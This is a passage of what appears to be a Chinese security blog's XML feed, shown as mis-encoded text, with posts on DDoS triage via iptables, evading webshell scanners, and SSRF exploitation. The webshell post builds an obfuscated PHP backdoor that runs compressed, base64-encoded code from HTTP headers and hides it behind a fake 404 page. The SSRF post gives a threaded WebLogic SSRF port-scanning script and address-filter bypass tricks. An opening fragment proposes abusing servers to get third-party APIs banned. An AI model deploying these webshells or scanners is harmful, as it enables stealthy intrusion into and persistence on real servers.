ï¼Œå¯èƒ½ç”¨æˆ·ä¸¾æŠ¥äº†ä»–ä»¬ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯è¿™æ ·å¯¼è‡´ä»–ä»¬å¾®ä¿¡APIè¢«å°ã€‚ äº‹åæƒ³äº†æƒ³ï¼Œè¿™TMæ€è·¯çœŸæ˜¯çŒ¥çå•Šï¼ï¼ï¼ ç„¶åè”æƒ³åˆ°ä¹‹å‰çŒªçŒªä¾ å°å¯†åœˆè¯´çš„ æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œæ¯”å¦‚ç³»ç»Ÿéœ€è¦è¯·æ±‚ç¬¬ä¸‰æ–¹APIï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„payloadè®©æœåŠ¡å™¨å‘é€æ¶æ„çš„åŒ…æˆ–è€…é¢‘ç¹è¯·æ±‚ç›¸å…³APIï¼Œé‚£ä¹ˆæ­¤æ¥å£å°±ä¼šè¢«å°æ‰ï¼Œé‚£ä¹ˆä¸šåŠ¡å°±å´©äº†ï¼]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linuxä¸‹DDosæ”»å‡»å¤„ç†æ–¹æ³•]]></title>
    <url>%2F2017%2F06%2F18%2Flinux%E4%B8%8BDDos%E6%94%BB%E5%87%BB%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[å½“æˆ‘ä»¬çš„ Linux æœåŠ¡å™¨å—åˆ°å°‘é‡æ”»å‡»æ—¶ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ iptables æ¥æ‰‹åŠ¨å°ç¦è¿™äº›æ”»å‡»è€…çš„IPã€‚ å¦‚æœæ”»å‡»æ¯”è¾ƒå¤§æ—¶ï¼Œæœ‰æ—¶æˆ‘ä»¬æ ¹æœ¬æ— æ³•å“åº”è¿‡æ¥ï¼Œiptables åŸºæœ¬ä¹Ÿå°±æ— èƒ½ä¸ºåŠ›äº†ã€‚ å¯¹äºå°‘é‡æ”»å‡»å¤„ç†çš„æ­¥éª¤åº”è¯¥æ˜¯ï¼šè·å–IP â€“&gt; å°IP 1ã€è·å–æ”»å‡»è€… IP1.1 é€šè¿‡ netstat è·å–å¦‚æœæ”»å‡»è€…æ”»å‡»çš„æ˜¯ä½ çš„ Web æœåŠ¡çš„è¯ï¼Œé»˜è®¤æ˜¯80ç«¯å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç ï¼ å¦‚æœæ”»å‡»çš„ä¸æ˜¯80ç«¯å£çš„è¯ï¼Œå°†ä¸‹é¢çš„ä¸¤ä¸ªæ•°å­—80æ”¹ä¸ºä½ è¢«æ”»å‡»çš„ç«¯å£å³å¯ï¼ å¦‚æœä½ éœ€è¦æ˜¾ç¤ºå¤šæ¡è®°å½•ï¼Œè¯·è‡ªå·±æ‰‹åŠ¨å°† head -n20 è°ƒå¤§å³å¯1netstat -anlp|grep 80|grep tcp|awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk &apos;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&apos; |sort -rn|head -n20 1.2 é€šè¿‡ tcpdump è·å–åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‚¨çš„ç³»ç»Ÿå·²ç»å®‰è£…äº† tcpdump ã€‚ Debian / Ubuntu ç³»åˆ—å¿«é€Ÿå®‰è£…å¦‚ä¸‹ apt-get install -y tcpdump å®‰è£…åï¼Œä½¿ç”¨ä¸‹é¢çš„ä»£ç å³å¯ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ -i eth0 æŒ‡çš„æ˜¯ä½ ä¸»ç½‘å¡ï¼Œå¦‚æœä½ æ˜¯ OpenVZ çš„è™šæ‹Ÿæœºçš„è¯ï¼Œå°±æ”¹æˆæ‚¨çš„ç½‘å¡åvenet0 åŒæ ·ä½ éœ€è¦è®¾ç½®çš„æ˜¯ï¼Œ port 80 è®¾ç½®ä½ è¢«æ”»å‡»çš„ç«¯å£ï¼Œ -c 1000 æŒ‡ tcpdump éœ€è¦ç»Ÿè®¡çš„è®°å½•æ•°ï¼Œä»–ä¼šåœ¨è¾¾åˆ°è¿™ä¸ªæ•°ä¹‹åæ˜¾ç¤ºç»“æœã€‚ head -20 è®¾ç½®ä½ è¦æ˜¾ç¤ºçš„è®°å½•æ¡æ•°1tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -nr |head -20 2ã€å°ç¦ IPé€šè¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“æ˜¯è°åœ¨æ”»å‡»æˆ‘ä»¬äº†ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å°†ä»–ä»¬æ‹‰å…¥ iptables ç¦æ­¢ä»–ä»¬è¿æ¥åˆ°æœåŠ¡å™¨äº†ã€‚ 2.1 å°ç¦å•ä¸ª IP1iptables -I INPUT -s 211.1.2.1 -j DROP 2.2 å°ç¦ä¸€ä¸ª IP æ®µ1iptables -I INPUT -s 211.1.2.0/16 -j DROP å¦‚æœéœ€è¦æ›´å¤šå…³äº iptables çš„æ•™ç¨‹ï¼Œç”±äºä¸åœ¨æœ¬å¸–éœ€è¦è®²è¿°çš„å†…å®¹å½“ä¸­ï¼Œè¯·è‡ªè¡Œ Google ç­”æ¡ˆã€‚ æ¥æºï¼š(https://imlonghao.com/8.html)[https://imlonghao.com/8.html]]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>tcpdump</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•å°æŠ€å·§ä¹‹è¿‡wafæœ¨é©¬]]></title>
    <url>%2F2017%2F06%2F05%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E8%BF%87waf%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[åœ¨ç ”ç©¶webshellæŸ¥æ€çš„æ—¶å€™ï¼Œå­¦ä¹ åˆ«äººæ€ä¹ˆç»•wafçš„æ€è·¯ï¼Œä»Šå¤©å‘ç°ä¸€ä¸ªå¾ˆ6çš„å‡½æ•°(è‡³å°‘ä¹‹å‰æˆ‘æ˜¯æ²¡è§è¿‡)ï¼Œç„¶åç»“åˆä¹‹å‰å†™è®¿é—®æ—¥å¿—è®°å½•æ–‡ä»¶æ—¶ç”¨åˆ°çš„æ–¹æ³•ï¼Œvery perfectï¼ Once stepæ™®é€šä¸€å¥è¯æœ¨é©¬ï¼š 1&lt;?php eval($_POST[&apos;caidao&apos;]);?&gt; Second stepé¦–å…ˆå¤§å®¶çœ‹ä¸‹è¿™ä¸ªä¸œè¥¿ï¼š ä¸çŸ¥é“å¤§å®¶çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ä¼šæœ‰å•¥æƒ³æ³•ï¼Œåæ­£è¯´å®è¯ï¼Œä¹‹å‰æˆ‘è‚¯å®šä¸ä¼šå¤ªåœ¨æ„ã€‚çœ‹ä¸‹æºç ï¼š1234$compressed = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);$uncompressed = gzuncompress($compressed);echo $compressed;?&gt; Third stepé‚£ä¹ˆé‡ç‚¹æ¥äº†ï¼ æˆ‘è¦è¯´çš„å°±æ˜¯gzcompressè¿™ä¸ªå‡½æ•°ã€‚ç„¶åæˆ‘åˆæŸ¥äº†æŸ¥ç›¸å…³èµ„æ–™ï¼Œæ‰¾åˆ°äº†PHPä¸­å…·æœ‰ç›¸åŒåŠŸèƒ½çš„å‡½æ•°è¿˜æœ‰ä¸¤ä¸ªï¼šgzdeflateï¼Œgzencodeã€‚ ç§‘æ™®ä¸‹:12345678910111213å‹ç¼©å‡½æ•°ï¼šgzcompress gzdeflate gzencodeè§£å‹å‡½æ•°ï¼šgzuncompress gzinflate gzdecodegzdecodeæ˜¯PHP 5.4.0ä¹‹åæ‰åŠ å…¥çš„ï¼Œä½¿ç”¨çš„æ—¶å€™è¦æ³¨æ„å…¼å®¹æ€§é—®é¢˜ã€‚è¿™å‡ ä¸ªå‡½æ•°éƒ½ä»¥gzå¼€å¤´ï¼Œè®©äººæƒ³åˆ°gzipå‹ç¼©ï¼Œè€Œå…‰çœ‹å‡½æ•°åå´åˆçœ‹ä¸å‡ºå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ï¼Œåªèƒ½æŸ¥æ–‡æ¡£ã€‚gzcompress gzdeflate gzencodeå‡½æ•°çš„åŒºåˆ«åœ¨äºå®ƒä»¬å‹ç¼©çš„æ•°æ®æ ¼å¼ä¸åŒï¼šgzcompressä½¿ç”¨çš„æ˜¯ZLIBæ ¼å¼ï¼›gzdeflateä½¿ç”¨çš„æ˜¯çº¯ç²¹çš„DEFLATEæ ¼å¼ï¼›gzencodeä½¿ç”¨çš„æ˜¯GZIPæ ¼å¼ï¼›å…¶å®ä»PHP 5.4.0å¼€å§‹ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç¬¬ä¸‰ä¸ªå‚æ•°çš„é»˜è®¤å€¼ä¸åŒï¼›å¦‚æœè°ƒç”¨æ—¶ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸‰ä¸ªå‡½æ•°è¿”å›çš„æ•°æ®ç›¸åŒã€‚æœ‰å…´è¶£çš„è‡ªå·±åœ¨æ‰¾æ‰¾å§ Fourth stepå†™ä¸ªç”Ÿæˆå¯†æ–‡çš„æ–‡ä»¶ã€‚ è€ƒè™‘åˆ°å¯èƒ½å­—ç¬¦æ˜¾ç¤ºä¸å…¨ï¼Œæ— æ³•è¯†åˆ«ç­‰åŸå› ï¼Œå†å¥—ä¸€å±‚base64ã€‚ 123456if(isset($_POST[&apos;str&apos;]))&#123; $str = $_POST[&apos;str&apos;]; $compressed = base64_encode(gzcompress($str, 9)); echo $compressed;&#125;?&gt; Fifth stepç»“åˆè®¿é—®æ—¥å¿—è®°å½•ç”¨åˆ°çš„getallheaderså‡½æ•°ï¼Œæœ€ç»ˆçš„webshellå¦‚ä¸‹ï¼š 1&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&apos;w2n1ck&apos;])));&gt; ç”¨Dç›¾æŸ¥ä¸€ä¸‹ è™½ç„¶çº§åˆ«æ˜¯å°äº3ï¼Œä½†æ˜¯è¯´æ˜é‡Œé¢æ˜¾ç¤ºå¯èƒ½evalåé—¨ï¼Œæ‰€ä»¥è¦å»æ‰è¿™ä¸ªï¼Œåœ¨å˜å½¢ä¸‹ï¼š1&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()[&apos;cai&apos;]));$w2n1ck1(gzuncompress(base64_decode(getallheaders()[&apos;dao&apos;])));&gt; çœ‹ä¸‹webshellå¯ç”¨æ€§ è¿™é‡Œæ³¨æ„ä¸‹ï¼Œä½¿ç”¨evalçš„è¯ä¼šæŠ¥é”™ï¼Œå…·ä½“çš„åŸå› è¯·æŸ¥çœ‹é”™è¯¯è¯¦æƒ… åœ¨å®‰åˆ©ä¸‹å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°ï¼š1&apos;`&apos;,eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open Sixth stepå†ç”¨Dç›¾æ£€æµ‹ä¸‹ è¿˜æ˜¯å¯ç–‘å•Šï¼Œé‚£è¡Œå†ä¼ªé€ ä¼ªé€ ä¸‹123456789101112131415&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;?php$cai=getallheaders()[&apos;cai&apos;];$dao=getallheaders()[&apos;dao&apos;];if($cai!=&quot;&quot; and $dao!=&quot;&quot;)&#123; $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));&#125;header(&apos;HTTP/1.1 404 Not Found&apos;);?&gt;&lt;/body&gt;&lt;/html&gt; å†æ£€æµ‹ä¸‹ï¼š 360 5å¼•æ“æ£€æµ‹ä¸‹very perfectï¼ å¦‚æœè§‰å¾—è‡ªå·±æ·»åŠ å¤´éº»çƒ¦å¯ç–‘ä½¿ç”¨è‡ªå¸¦çš„è¯·æ±‚å¤´å­—æ®µï¼š123getallheaders()[&apos;Accept-Language&apos;]getallheaders()[&apos;User-Agent&apos;]getallheaders()[&apos;Accept&apos;]]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>Dç›¾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRFæ¼æ´å‰–æä¸åˆ©ç”¨]]></title>
    <url>%2F2017%2F06%2F04%2FSSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ç©çš„æ—¶å€™æƒ³æ‰¾ä¸€ä¸‹SSRFçš„ç›¸å…³çŸ¥è¯†ï¼Œå»è‡ªå·±åšå®¢ä¸Šä¸€çœ‹ï¼ŒWTFç«Ÿç„¶è¿˜æ²¡æœ‰ï¼å¥½å§ã€‚ã€‚é‚£å°±å†™ä¸€ä¸ªå§ï¼Œæ–¹ä¾¿è‡ªå·±ä»¥åæŸ¥çœ‹ï¼Œå¤§ç‰›ä»¬å¤šå¤šæŒ‡ç‚¹ã€‚ Know it(è®©æˆ‘è£…ä¸ªé€¼ï¼Œæ¨¡ä»¿ä¸‹çŒªçŒªä¾ çš„è¯ã€‚ã€‚ã€‚) ä»€ä¹ˆæ˜¯SSRFFreebuf:å¾ˆå¤šwebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼Œwebåº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚è¿™ä¸ªåŠŸèƒ½å¦‚æœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚è¿™ç§å½¢å¼çš„æ”»å‡»ç§°ä¸ºæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆServer-side Request Forgeryï¼‰ ä¸€å¥è¯å°±æ˜¯ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼Œå½“ä½œè·³æ¿æ¥æ”»å‡»å…¶ä»–æœåŠ¡ã€‚ SSRFèƒ½å¹²ä»€ä¹ˆ æ¢æµ‹å†…ç½‘ä¿¡æ¯ æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡ ç©¿é€é˜²ç«å¢™ ã€‚ã€‚ã€‚ æ€ä¹ˆæ‰¾SSRFæ¼æ´ èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹ æ•°æ®åº“å†…ç½®åŠŸèƒ½ é‚®ä»¶ç³»ç»Ÿ æ–‡ä»¶å¤„ç† ã€‚ã€‚ã€‚ ä¸¾å‡ ä¸ªä¾‹å­ï¼š åœ¨çº¿è¯†å›¾ï¼Œåœ¨çº¿æ–‡æ¡£ç¿»è¯‘ï¼Œåˆ†äº«ï¼Œè®¢é˜…ç­‰ï¼Œè¿™äº›æœ‰çš„éƒ½ä¼šå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚ æ ¹æ®è¿œç¨‹URLä¸Šä¼ ï¼Œé™æ€èµ„æºå›¾ç‰‡ç­‰ï¼Œè¿™äº›ä¼šè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨çš„èµ„æºã€‚ æ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°ï¼Œè¿™ç‚¹çœ‹çŒªçŒªä¾ è®²çš„å§ï¼Œæ²¡å®è·µè¿‡ã€‚ é‚®ä»¶ç³»ç»Ÿå°±æ˜¯æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€è¿™äº›åœ°æ–¹ã€‚ æ–‡ä»¶å°±æ‰¾ImageMagickï¼Œxmlè¿™äº›ã€‚ ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼Œæ¯”å¦‚ï¼šsource,share,link,src,imageurl,targetç­‰ã€‚ SSRFæ€ä¹ˆå½¢æˆçš„SSRFå½¢æˆçš„åŸå› å°±æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†èƒ½å¤Ÿå‘èµ·ç½‘ç»œè¯·æ±‚æˆ–è€…ä»å…¶ä»–æœåŠ¡å™¨è·å–ç›¸å…³èµ„æºæ•°æ®ç­‰ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ç›¸å…³ç›®æ ‡åœ°å€åšä»»ä½•çš„é™åˆ¶æˆ–è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´SSRFæ¼æ´ã€‚ Hack itæ¼æ´å¤ç°ä¸»è¦æ¨¡ä»¿curlæ¥è¯·æ±‚èµ„æºï¼Œå†™å…¥ç›¸å…³æ–‡ä»¶ï¼Œä¹‹åå¹¶æ˜¾ç¤ºç›¸å…³æ•°æ®ã€‚ ssrf.html1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;ssrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt; &lt;form name=&quot;input&quot; action=&quot;ssrf.php&quot; method=&quot;POST&quot;&gt; &lt;h2&gt;Search: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;&lt;/h2&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ssrf.php1234567891011121314151617&lt;?phpif(isset($_POST[&apos;url&apos;]))&#123; $link = $_POST[&apos;url&apos;]; $filename = &apos;./&apos;.rand().&apos;.txt&apos;; $curlobj = curl_init($link); $fp = fopen($filename,&quot;w&quot;); curl_setopt($curlobj,CURLOPT_FILE,$fp); curl_setopt($curlobj,CURLOPT_HEADER,0); curl_exec($curlobj); curl_close($curlobj); fclose($fp); $fp = fopen($filename,&quot;r&quot;); $result = fread($fp,filesize($filename)); fclose($fp); echo $result;&#125;?&gt; è¿™é‡Œä½¿ç”¨192.168.1.113ä½œä¸ºè¾¹ç•ŒæœåŠ¡å™¨ï¼Œ192.168.2.3ä½œä¸ºå†…ç½‘æœåŠ¡å™¨ã€‚æ•°æ®å†…ç½‘æœåŠ¡å™¨åœ°å€æˆåŠŸæ˜¾ç¤ºå†…ç½‘æœåŠ¡å™¨ä¿¡æ¯ æ¼æ´å®è·µè¿™é‡Œä»¥weblogicçš„SSRFä¸ºä¾‹(çŒªçŒªä¾ æ‰€è¯´çš„ç¥æ´)ã€‚å¦‚å›¾æ˜¾ç¤ºåˆ™å°±æ˜¯å­˜åœ¨SSRFæ¼æ´äº†ã€‚ å¥½äº†ï¼Œåˆ°ç°åœ¨å’±ä»¬å·²ç»çŸ¥é“å­˜åœ¨è¿™ä¸ªæ¼æ´äº†ï¼Œç„¶ååº”è¯¥æ€æ ·å¿«é€Ÿå®šä½è¯¥æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘åœ°å€å‘¢? è¿™é‡Œç›®å‰æˆ‘çŸ¥é“çš„æœ‰ä¸‰ç§æ–¹æ³•ï¼š ä½¿ç”¨è„šæœ¬çˆ†ç ´192.168.*.*ï¼Œ172.16.*.*-172.31.*.*ï¼Œ10.*.*.*è¿™ä¸‰ä¸ªå†…ç½‘æ®µ ä½¿ç”¨burpçˆ†ç ´åŒä¸Š ä½¿ç”¨file:/// ï¼Œgophar://ï¼Œftp://ç­‰è¿™äº›æœåŠ¡å™¨å…è®¸çš„åè®®å»è¯»å–procé‡Œå¯èƒ½åŒ…å«IPåœ°å€ä¿¡æ¯çš„ç›¸å…³æ–‡ä»¶ è¿™é‡Œæˆ‘å°±å…ˆç®€å•ç²—æš´çš„ä½¿ç”¨burpæ¥ä¸€å‘å§ã€‚ ã€‚ã€‚ã€‚è¿æ°”çœŸç‰¹ä¹ˆçš„å¥½ã€‚ å†…ç½‘æ¢æµ‹æ¢æµ‹å†…ç½‘å†…çš„æ‰€æœ‰ä¸»æœºåŠå¼€æ”¾çš„ç«¯å£ä¿¡æ¯ã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@Indexï¼šhttp://www.w2n1ck.com/&apos;&apos;&apos;import Queuefrom threading import Threadimport threadingimport urllibimport urllib2import reimport requestsbase_url = &apos;http://xxx.xxx.xxx&apos;thread_list=[]port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]que = Queue.Queue()lock = threading.Lock()for port in port_list: que.put(port)def run(): for i in range(1,256): while que.qsize() &gt; 0: port = que.get() #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port) url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port) try: content = requests.get(url,timeout=20,verify=False).content #ssrfæ£€æµ‹ result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content) result2 = re.findall(&apos;but could not connect&apos;,content) result3 = re.findall(&apos;No route to host&apos;,content) if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port) except Exception,e: passif __name__ == &apos;__main__&apos;: for i in xrange(20): t=Thread(target=run) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() SSRFç»•è¿‡æŠ€å·§1ã€@123http://abc@127.0.0.1å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·åabcè¿æ¥åˆ°ç«™ç‚¹127.0.0.1ï¼ŒåŒç†http://8.8.8.8@127.0.0.1:8080ã€http://127.0.0.1#8.8.8.8 2ã€æ·»åŠ ç«¯å£å·1http://127.0.0.1:8080 3ã€çŸ­åœ°å€1http://á„’.ws/ir 4ã€ç‰¹æ®ŠåŸŸå12310.0.0.1.xip.io == 10.0.0.1www.10.0.0.1.xip.io == 10.0.0.1fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1 5ã€ipè¿›åˆ¶è½¬æ¢12345678910111213141516é¦–å…ˆä»¥ . åˆ†å‰²æ•°å­—ç„¶åè¿›è¡Œ10è¿›åˆ¶è½¬æ¢16è¿›åˆ¶ç„¶åæŠŠè¿™ä¸²åå…­è¿›åˆ¶åˆåœ¨ä¸€èµ·å†è½¬æ¢æˆ8è¿›åˆ¶ç„¶åæŒ‡å®šåè®® http://ï¼Œå¯ç”¨ä»»æ„ä¸ª 0 ä½œä¸ºå‰ç¼€ï¼šhttp://000007F000001ï¼›ï¼ˆåœ¨å‰é¢æ·»åŠ è¿‡å¤šçš„ 0ï¼Œåœ¨å®é™…SSRFæˆ–è€…XSSä¸­æœ‰æ—¶ä¼šæˆä¸ºç»•è¿‡è¿‡æ»¤çš„å¤§æ€å™¨ï¼‰1ã€åˆ©ç”¨å…«è¿›åˆ¶IPåœ°å€ç»•è¿‡ping -w 0 -n 1 012.0.0.12ã€åˆ©ç”¨åå…­è¿›åˆ¶IPåœ°å€ç»•è¿‡ping -w 0 -n 1 0xa.0.0.13ã€ åˆ©ç”¨åè¿›åˆ¶çš„IPåœ°å€ç»•è¿‡ping -w 0 -n 1 167772161åœ¨PHPé‡Œä½¿ç”¨ip2longåœ¨Pythoné‡Œä½¿ç”¨inet_aton4ã€åˆ©ç”¨IPåœ°å€çš„çœç•¥å†™æ³•ç»•è¿‡ping -w 0 -n 1 10.1 SSRFé˜²å¾¡æ¨èå‚è€ƒï¼šè°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>SSRF</tag>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çˆ¬è™«å…¥åº“å®æˆ˜ä¹‹å¹²æ­»åçˆ¬è™«]]></title>
    <url>%2F2017%2F06%2F02%2F%E7%88%AC%E8%99%AB%E5%85%A5%E5%BA%93%E5%AE%9E%E6%88%98%E4%B9%8B%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[çˆ¬è™«å› ä¸ºéœ€è¦å¤§é‡æŠ“å–ç½‘é¡µï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šè¢«ban IPï¼Œæ‰€ä»¥é€šå¸¸ä½¿ç”¨åŠ UAã€ä»£ç†ã€XFFç­‰ä¼ªé€ çœŸå®IPç­‰ç­–ç•¥ï¼Œå…¶ä¸­X-Forwarded-For,Client-ip,REMOTE_ADDRå¯ä»¥ä½¿ç”¨burpçš„çˆ†ç ´æ¨¡å—ï¼Œå››ä¸ªpayloadéšæœºç”Ÿæˆå°±è¡Œäº†ï¼Œæœ¬æ–‡é‡ç‚¹ä½¿ç”¨UAã€ä»£ç†IPæµ‹è¯•ã€‚ 0x00 è®¾ç½®ç¼–ç é¦–å…ˆè®¾ç½®ä¸‹é»˜è®¤ç¼–ç ã€‚1234567æ–‡ä»¶ç¼–ç reload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)æ•°æ®åº“ç¼–ç CREATE DATABASE &apos;proxy&apos; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;æ•°æ®ä¼ è¾“ç¼–ç charset=&apos;utf8mb4&apos; 0x01 è®¾ç½®UA123456789101112config=&#123; &apos;NUM&apos;:10, &apos;timeout&apos;:5, &apos;USER_AGENTS&apos;:[ &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125; å¯ä»¥ä½¿ç”¨å­—å…¸æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†ç®€ä¾¿å°±éšæœºç²˜äº†å‡ ä¸ªã€‚ 0x02 